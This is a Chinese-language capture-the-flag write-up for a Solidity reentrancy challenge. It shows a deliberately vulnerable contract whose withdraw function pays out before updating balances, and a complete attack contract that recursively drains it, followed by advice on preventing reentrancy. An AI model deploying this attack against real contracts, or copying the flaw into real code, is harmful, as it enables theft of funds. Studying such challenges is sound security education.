# Re-entrancy

## 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

## 要求
这一关的目标是偷走合约的所有资产.

## 分析
合约部署的时候转入了ETH,所以即使不调用`donate`合约里还是有余额的.
`withdraw`函数判断了用户的余额并提现,但是合约先`msg.sender.call{value:_amount}("")`,然后再`balances[msg.sender] -= _amount`改变状态,可以进行[重入攻击](https://github.com/AmazingAng/WTF-Solidity/blob/main/S01_ReentrancyAttack/readme.md).如果`msg.sender`是恶意合约(在`receive`或`fallback`调用`withdraw`)则会递归调用直至掏空合约.

## 攻击步骤
1. 实现攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IReentrance {
    function donate(address to) external payable;

    function withdraw(uint256 amount) external;
}

contract ReentranceAttack {
    IReentrance public reentrance;

    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    function attack() external payable {
        //donate eth
        reentrance.donate{value: msg.value}(address(this));
        //withdrawß
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(msg.value);
        }
    }
}

```
2. 获取合约余额然后发送相同余额调用攻击合约`attack`(这里注意发送的eth需要和目标合约余额相同,因为`donate`进去正好是1:1,方便`withdraw`递归调用来掏空)

为了防止转移资产时的重入攻击, 使用 [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) 注意 `call` 只会返回 false 而不中断执行流. 其它方案比如 [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) 或 [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) 也可以使用.

`transfer` 和 `send` 不再被推荐使用, 因为他们在 Istanbul 硬分叉之后可能破坏合约 [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

假设资产的接受方可能是另一个合约, 而不是一个普通的地址. 因此, 他有可能执行了他的payable fallback 之后又“重新进入” 你的合约, 这可能会打乱你的状态或是逻辑.

重入是一种常见的攻击. 你得随时准备好!


